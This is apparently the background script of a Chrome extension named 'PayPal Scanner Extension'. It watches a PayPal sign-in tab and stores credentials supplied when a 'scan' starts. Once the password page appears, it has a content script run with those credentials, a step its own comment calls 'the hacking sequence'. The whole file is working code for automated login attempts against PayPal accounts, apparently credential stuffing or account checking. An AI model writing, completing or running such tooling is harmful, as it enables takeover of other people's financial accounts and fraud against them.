// Global variables to track state
let currentTab = null;
let scanInProgress = false;
let lastSettings = null;
let lastCredentials = null;

// Listen for installation event
chrome.runtime.onInstalled.addListener(() => {
  console.log("PayPal Scanner Extension installed");
});

// Listen for tab updates to detect when PayPal transitions from email to password page
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  // Only process if we're tracking this tab and a scan is in progress
  if (scanInProgress && currentTab && tabId === currentTab.id) {
    // If the page has completed loading
    if (changeInfo.status === 'complete') {
      // Check if this is a PayPal URL
      if (tab.url.includes('paypal.com/signin')) {
        // Send a message to the content script to check if it's the password page
        setTimeout(() => {
          chrome.tabs.sendMessage(tabId, { action: "checkPasswordPage" }, (response) => {
            // If no response or error, ignore (could be a navigation that's not the password page)
            if (chrome.runtime.lastError) {
              return;
            }
            
            // If it's the password page, continue the hacking sequence
            if (response && response.isPasswordPage) {
              chrome.tabs.sendMessage(tabId, {
                action: "execute",
                settings: lastSettings,
                credentials: lastCredentials
              });
            }
          });
        }, 1000); // Wait a second for the page to stabilize
      }
    }
  }
});

// Listen for messages from content script or popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "pageDetected") {
    console.log("PayPal page detected:", sender.tab.url);
    
    // Store the tab information
    if (sender.tab) {
      currentTab = sender.tab;
    }
    
    // If this is the password page and a scan is in progress, auto-continue
    if (message.isPasswordPage && scanInProgress && lastSettings && lastCredentials) {
      // Short delay to ensure the page is ready
      setTimeout(() => {
        chrome.tabs.sendMessage(currentTab.id, {
          action: "execute",
          settings: lastSettings,
          credentials: lastCredentials
        });
      }, 800);
    }
    
    sendResponse({ status: "acknowledged" });
  }
  else if (message.action === "scanStarted") {
    // Mark that a scan is in progress and store settings for later use
    scanInProgress = true;
    lastSettings = message.settings;
    lastCredentials = message.credentials;
    sendResponse({ status: "acknowledged" });
  }
  else if (message.action === "scanCompleted") {
    // Mark that the scan is no longer in progress
    scanInProgress = false;
    sendResponse({ status: "acknowledged" });
  }
  
  // Keep the message channel open for asynchronous response
  return true;
});